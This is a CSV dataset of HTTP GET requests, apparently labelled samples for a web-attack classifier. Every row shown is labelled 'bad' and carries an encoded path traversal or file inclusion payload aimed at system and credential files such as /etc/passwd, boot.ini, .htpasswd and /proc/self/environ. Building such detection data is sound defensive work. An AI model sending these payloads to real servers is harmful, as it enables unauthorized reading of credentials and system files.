method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../windows/system32/drivers/etc/hosts,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%bg%qf..%bg%qf..%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\..\..\..\..\..\boot.ini,,0,6,5,3,1,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®ð€€¯windowsð€€¯system32ð€€¯driversð€€¯etcð€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀîÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯%2%e%2%eð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??ø€€€¯??ø€€€¯??ø€€€¯??ø€€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=///../../../../../etc///issue,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ\%c0%ae%c0%aeÀ\%c0%ae%c0%aeÀ\%c0%ae%c0%aeÀ\%c0%ae%c0%aeÀ\%c0%ae%c0%aeÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%5c??%5c??%5c??%5cetc%5cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..0x2f..0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/log/auth.log.0,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%5%c.../.%5%c.../.%5%cetc%5%cissue,,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.?%5c.?%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=D:/inetpub/wwwroot/global.asa,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À^À^%2%fÀ^À^%2%fÀ^À^%2%fÀ^À^%2%fetc%2%fpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯À.À.ø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%5c\..%5c\..%5c\..%5c\..%5c\..%5cboot.ini,,0,6,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À/..À/..À/{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®À%9vø€€€®ø€€€®À%9vboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%bg%qf?.%bg%qf?.%bg%qf?.%bg%qf?.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.%uF025À.À.%uF025À.À.%uF025À.À.%uF025À.À.%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁ%2e%2eÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/..\..\..\..\..\..\..\..\{FILE},,0,8,7,4,0,0,0,bad
GET,/vulnerabilities/fi/?page=/var/log/proftpd.xferlog,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html,,0,3,2,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..\\\..\\\,,0,2,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cø€€€®ø€€€®%5%cetc%5%cpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/my.conf,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\{FILE},,0,1,75,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??À%qf??À%qf??À%qf??À%qf??À%qfwindowsÀ%qfsystem32À%qfdriversÀ%qfetcÀ%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=C:/windows/system32/sysprepunattend.xml,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî0x2fÀîÀî0x2fÀîÀî0x2fÀîÀî0x2fÀîÀî0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cð€€®ð€€®0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\..\..\..\..\windows\system32\drivers\etc\hosts,,0,5,4,2,1,0,2,bad
GET,/vulnerabilities/fi/?page=À.À.ÁÀ.À.ÁÀ.À.ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÀ%9v0x2e0x2eÀ%9v0x2e0x2eÀ%9v0x2e0x2eÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,,6,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/.../.../.../.../.../.../.../{FILE},,7,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeà€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../proc/self/fd/8,,10,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%2f..%2f..%2f/etc/passwd,,3,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^À¯À^À^À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%uF025.../.%uF025.../.%uF025.../.%uF025.../.%uF025etc%uF025passwd,,5,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯ÀþÀþÀ¯etcÀ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=??Á??Á??ÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=../../../../../../proc/self/environ,,6,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/hostname.eri2,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=user/.htpasswd,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeà€¯%c0%ae%c0%aeà€¯%c0%ae%c0%aeà€¯%c0%ae%c0%aeà€¯%c0%ae%c0%aeà€¯%c0%ae%c0%aeà€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%2fÀ.À.%2fÀ.À.%2fÀ.À.%2fÀ.À.%2fÀ.À.%2fetc%2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts,,0,5,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vü€€€€®ü€€€€®À%9vetcÀ%9vissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®/ü€€€€®ü€€€€®/ü€€€€®ü€€€€®/etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../,,4,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%5%cÀþÀþ%5%cÀþÀþ%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cð€€®ð€€®%5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/system32/drivers/etc/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
